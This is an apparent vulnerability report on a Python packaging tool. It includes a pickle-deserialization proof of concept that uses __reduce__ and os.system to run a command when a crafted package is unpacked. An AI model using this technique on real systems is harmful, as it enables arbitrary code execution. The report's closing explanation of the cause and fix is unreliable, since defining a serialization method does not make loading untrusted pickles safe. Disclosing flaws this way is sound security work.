## CWE-1066: The product contains a serializable data element that does not have an associated serialization method.

**Location:**  
- Class: `DataContainer`  
- File: `src/main.py`, lines 6-9  
- Usage: `Packager.export()` (serializes instance with `pickle.dump`), lines 17-20; `Packager.import_package()` (deserializes with `pickle.load`), lines 22-25.

**Verification Steps:**

1. _Install requirements (none needed):_
   ```
   cd projects/Datapackager
   ```

2. _Prepare a malicious `malicious.py` class to abuse pickle deserialization:_
   ```python
   # projects/Datapackager/malicious.py
   import pickle
   import os

   class DataContainer:
       def __reduce__(self):
           return (os.system, ('echo MALICIOUS_CODE > exploited.txt',))

   # Generate a malicious package
   with open('malicious_package.dp', 'wb') as f:
       obj = DataContainer()
       pickle.dump(obj, f)
   ```
3. _Run the malicious generator:_
   ```
   python3 malicious.py
   ```

4. _Run the Datapackager tool to "unpack" the malicious package (will execute payload):_
   ```
   python3 src/main.py unpack malicious_package.dp
   ```
   - This will create a file named `exploited.txt` in the current directory if the deserialization is vulnerable.

5. _Check for the presence of the malicious file:_
   ```
   cat exploited.txt
   # Output should be: MALICIOUS_CODE
   ```

**Summary:**
- The absence of a custom serialization strategy (e.g., using `__reduce__` or safe serialization/deserialization) in `DataContainer` allows replacement of this class by an attacker, so unsafe code execution is triggered during unpickling, demonstrating CWE-1066.
